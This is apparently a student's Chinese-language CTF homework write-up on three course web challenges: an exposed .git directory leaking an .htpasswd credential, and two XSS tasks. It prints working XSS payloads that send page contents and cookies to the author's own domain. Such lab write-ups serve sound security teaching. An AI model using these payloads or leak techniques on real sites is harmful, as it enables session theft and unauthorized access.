# HW4 writeup

## The Stupid Content Tracker
### Solution
點開本題的連結後可以看到 .git 目錄，一看到 .git 就想到裡面可能有些有趣的東西，於使我使用 [git-dumper](https://github.com/arthaud/git-dumper) 這項工具將整個 .git 載下來。

```
user@kali:~/git-dumper$ ./git-dumper.py https://edu-ctf.csie.org:44302/.git/ ~/project
```

進去 `project` 目錄後，發現有一個可疑的目錄 `admin_portal_non_production`。進去後發現裡面有一個 PHP 檔，它會印出 flag，不過 flag 是在環境變數中，因此無法從原始碼得知。

不過無所謂我們試著瀏覽看看 `admin_portal_non_production/index.php` 。

![](https://i.imgur.com/qxFApNp.png)


看來在我們不知道帳號密碼下是無法 access `index.php` 的。

不過，既然我們有 .git 目錄，我們就試看看會不會開發者不小心將 password file 給 commit 進去。試看看 `git log`

```
commit 51d768c7d3eb3ea8104c2a76598b95702f4724a3 (HEAD -> master)
Author: bookgin <dongsheoil@gmail.com>
Date:   Sun Nov 1 22:55:50 2020 +0800

    Add gitignore so password will not be added again

...

commit 2577aafa9bf476037cb011d59cf433d8a0c09c96
Author: bookgin <dongsheoil@gmail.com>
Date:   Sun Nov 1 22:38:45 2020 +0800

    Add password

commit a405fdd6c7e093afbe1f7a78dc08df273504a4fa
Author: bookgin <dongsheoil@gmail.com>
Date:   Sun Nov 1 22:33:48 2020 +0800

    Init commit
(END)
```

哈哈，commit `2577aafa9bf476037cb011d59cf433d8a0c09c96` 很有可能存有 password file。

利用指令 `git reset --hard 2577aafa9bf476037cb011d59cf433d8a0c09c96` 回溯到 `2577aafa9bf476037cb011d59cf433d8a0c09c96` 看看：

```
user@kali:~/project$ cd admin_portal_non_production/
user@kali:~/project/admin_portal_non_production$ ls -al
total 16
drwxr-xr-x 2 user user 4096 Nov  4 21:59 .
drwxr-xr-x 4 user user 4096 Nov  4 21:59 ..
-rw-r--r-- 1 user user   30 Nov  4 21:59 .htpasswd
-rw-r--r-- 1 user user   32 Nov  4 21:39 index.php
user@kali:~/project/admin_portal_non_production$ cat .htpasswd 
thewebmaster:ols2Xrmdja7XaaMP
user@kali:~/project/admin_portal_non_production$ 
```
找到帳密了 :+1: 。用 `.htpasswd` 裡的那組帳密登入後就會噴 flag 回來了。

![](https://i.imgur.com/sVbbbYA.png)

## Zero Note Revenge
### Solution
點開本題的連結後可以看到一個留言板。先註冊一下後就可以留言了。
看到 `Create new notes` ，第一件事就是想到可以 XSS。輸入 `<img src=x onerror="alert(1)">` 看看：

![](https://i.imgur.com/TrteJ8Q.png)

果然有 XSS 漏洞，跟課堂練習的一樣。

不過這次要取得的是 httpOnly 的 cookie ( 也就是`rack.session` )。httpOnly 的 cookie 是無法由 `document.cookie` 取得的。乍看之下本題無解...

不過，經過許多測試之後，發現當我們想要 access 不存在的 `note` 時 ( 例如 `https://edu-ctf.csie.org:44301/note/meow` ) ：

![](https://i.imgur.com/VtQXRV6.png)

會有怪怪的東西跑出來。這似乎是開發人員加上的 debug message，仔細一看上面有我要的 cookie 。

因此，我們希望做的事是讓 admin 點開一個不存在的網站，例如 `https://edu-ctf.csie.org:44301/note/meow`，然後利用 XSS 漏洞讓 admin 去 query 我所控制的 domain 後，取到 `https://edu-ctf.csie.org:44301/note/meow` 整個頁面的 body (可能需要經過一下 base 64 encoding)。

以下是我使用的 javascript XSS payload：
```htmlmixed
<script>
/* wxrdnx.tw 是我控制的 domain */
async function main() {
  let response = await fetch('https://edu-ctf.csie.org:44301/note/meow');
  let text = await response.text();
  fetch('https://wxrdnx.tw/?c=' + btoa(text));
}
main();
</script>
```
創造一個帶有以上 XSS payload 的 note，然後點選 `Report to admin` ，理論上 admin 就會觸發這個 XSS payload。翻開我的 web server 的 `access.log` 後可以看到 base64 encode 過的 body：

![](https://i.imgur.com/5VEQ1F5.png)

base64 decode 完後可以發現我們要的 httpOnly cookie (`rack.session` )，裡面就有我們的 flag。

![](https://i.imgur.com/2SMnzeW.png)

## Zero Meme
### Solution
隨便試看看幾種不同的 input 後，發現 image 的 link 必須要是 http or https 開頭，不過沒有過濾掉特殊字元，因此還是有 XSS漏洞。

試看看 `http://"><script>alert(1)</script>` 後，發現的確觸發了 XSS 漏洞。

![](https://i.imgur.com/qIyto5x.png)

不過當我送 XSS payload `http://"><script>fetch('https://wxrdnx.tw/?c='+document.cookie)</script>` 給 admin 去點後：

![](https://i.imgur.com/pIPZATx.png)

發現 link 竟然有做 URL encoding。

![](https://i.imgur.com/6v2d3Qo.png)

因此，XSS 變得沒有甚麼用了。

另外，本題有說 cookie 有設 `Set-Cookie: SameSite=Lax`，加上沒有 `
Access-Control-Allow-Origin` 之類的 header。因此 XSS，CSRF，CORS 之類的跨域攻擊變得更沒有甚麼用了。

想了非常非常久後，我換了一個想法，把腦筋動到上一題去了。本題使用的 cookie domain 是 `edu-ctf.csie.org`，和 Zero Note Revenge 的 cookie 的 domain 是一樣的。於是我試了看看傳給 admin 上一題的含有 XSS 漏洞的網頁：

![](https://i.imgur.com/P6KjWBg.png)

然後就得到 flag 了？！

![](https://i.imgur.com/hDLW0v2.png)

更新：原因是
1. `Set-Cookie: SameSite=Lax` 允許我們的 cookie 通過 top-level navigation ( 例如 `<a href=example.com>` 或 `window.open('https://example.com')` 等 ) 的 GET 請求一起發送。
2. 題有敘述 admin 每次都會重新登入並點擊鏈結 ( 是 GET 請求以及 top-level 的 navigation )，符合 `SameSite=Lax` 攜帶 cookie 的規則。因此一旦 admin 觸發了 XSS payload 後，到我所掌控的 server 上查看 `access.log` 就能看到 cookie 了。
